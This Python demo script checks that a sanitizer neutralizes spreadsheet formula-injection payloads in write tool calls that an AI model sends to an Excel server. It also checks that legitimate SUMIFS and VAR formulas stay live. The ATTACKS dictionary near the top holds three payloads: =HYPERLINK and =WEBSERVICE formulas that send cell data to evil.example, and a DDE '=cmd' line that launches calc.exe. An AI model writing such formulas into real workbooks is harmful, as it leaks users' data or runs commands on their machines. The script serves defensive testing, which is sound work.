#!/usr/bin/env python3
"""
demo_neutralize.py — Reproducible proof the Reviewer can re-run himself.

For each of the 3 threat-model payloads (=HYPERLINK exfil, DDE =cmd, =WEBSERVICE) it:
  1. builds the write tool call the model would emit (payload riding in real cell data),
  2. runs it through the SAME runtime interceptor (runtime_overlay.guard_tool_arguments),
  3. performs the genuine openpyxl write with the sanitized args (what excel-mcp-server
     does internally),
  4. REOPENS the produced .xlsx and prints the on-disk cell state (data_type + value),
     proving the cell is inert TEXT, not a live formula.

Then it does the control-positive: a legitimate T01 SUMIFS and a T05 variance formula —
proving they survive as LIVE formulas (data_type 'f').

No assertions here — just evidence. Run:
    python3 platform/sanitizer/demo_neutralize.py
Files land in a temp dir, paths printed so they can be opened in Excel.
"""

from __future__ import annotations

import sys
import tempfile
from pathlib import Path

import openpyxl

_SAN_DIR = Path(__file__).resolve().parent
sys.path.insert(0, str(_SAN_DIR))

from runtime_overlay import guard_tool_arguments, default_guard  # noqa: E402

ATTACKS = {
    "1. =HYPERLINK exfil": '=HYPERLINK("http://evil.example/?leak="&A1,"Ver detalle")',
    "2. DDE =cmd":          '=cmd|\'/c calc.exe\'!A0',
    "3. =WEBSERVICE exfil": '=WEBSERVICE("http://evil.example/collect?d="&TEXT(B2,"0"))',
}

CONTROL = {
    "T01 SUMIFS (legit)":   '=SUMIFS(Transacciones!C:C,Transacciones!A:A,">="&DATE(2026,5,1))',
    "T05 varianza (legit)": '=VAR(Actual!B2:B13)',
}


def _data_type_label(dt: str) -> str:
    return {"f": "LIVE FORMULA", "s": "inert TEXT", "n": "number"}.get(dt, dt)


def run_attacks(workdir: Path) -> None:
    guard = default_guard()
    print("=" * 72)
    print("ATTACKS — each payload arrives as untrusted cell data via write_data_to_excel")
    print("=" * 72)
    for label, payload in ATTACKS.items():
        out = workdir / f"attack_{label[0]}.xlsx"
        raw_args = {
            "filepath": str(out),
            "sheet_name": "Comparables",
            "data": [["Ticker", "Nota"], ["XYZ", payload]],
            "start_cell": "A1",
        }
        sanitized, events = guard_tool_arguments("write_data_to_excel", raw_args, guard)

        wb = openpyxl.Workbook()
        ws = wb.active
        ws.title = "Comparables"
        for r, row in enumerate(sanitized["data"], start=1):
            for c, val in enumerate(row, start=1):
                ws.cell(row=r, column=c, value=val)
        wb.save(out)
        wb.close()

        wb2 = openpyxl.load_workbook(out)
        cell = wb2["Comparables"]["B2"]
        print(f"\n[{label}]")
        print(f"  payload in        : {payload}")
        print(f"  interceptor event : {events[0]['action']} — {events[0]['reason']}")
        print(f"  arg after guard   : {sanitized['data'][1][1]!r}")
        print(f"  cell B2 on disk   : data_type={cell.data_type!r} "
              f"({_data_type_label(cell.data_type)})  value={cell.value!r}")
        verdict = "NEUTRALIZED — opens as text, formula never fires" \
            if cell.data_type != "f" else "*** STILL LIVE — FAIL ***"
        print(f"  verdict           : {verdict}")
        print(f"  file              : {out}")
        wb2.close()


def run_control(workdir: Path) -> None:
    guard = default_guard()
    print("\n" + "=" * 72)
    print("CONTROL-POSITIVE — legit template formulas must STAY live (lesson M002)")
    print("=" * 72)
    for label, formula in CONTROL.items():
        out = workdir / f"control_{label.split()[0]}.xlsx"
        raw_args = {
            "filepath": str(out),
            "sheet_name": "Resultados",
            "cell": "D5",
            "formula": formula,
        }
        sanitized, events = guard_tool_arguments("apply_formula", raw_args, guard)

        wb = openpyxl.Workbook()
        ws = wb.active
        ws.title = "Resultados"
        ws["D5"] = sanitized["formula"]
        wb.save(out)
        wb.close()

        wb2 = openpyxl.load_workbook(out)
        cell = wb2["Resultados"]["D5"]
        print(f"\n[{label}]")
        print(f"  formula in        : {formula}")
        print(f"  interceptor event : {'(none — passed clean)' if not events else events}")
        print(f"  cell D5 on disk   : data_type={cell.data_type!r} "
              f"({_data_type_label(cell.data_type)})  value={cell.value!r}")
        verdict = "ALIVE — feature preserved" if cell.data_type == "f" \
            else "*** KILLED LEGIT FORMULA — FAIL ***"
        print(f"  verdict           : {verdict}")
        print(f"  file              : {out}")
        wb2.close()


def main() -> None:
    workdir = Path(tempfile.mkdtemp(prefix="puppet_sanitizer_demo_"))
    run_attacks(workdir)
    run_control(workdir)
    print("\n" + "=" * 72)
    print(f"All artifacts in: {workdir}")
    print("=" * 72)


if __name__ == "__main__":
    main()
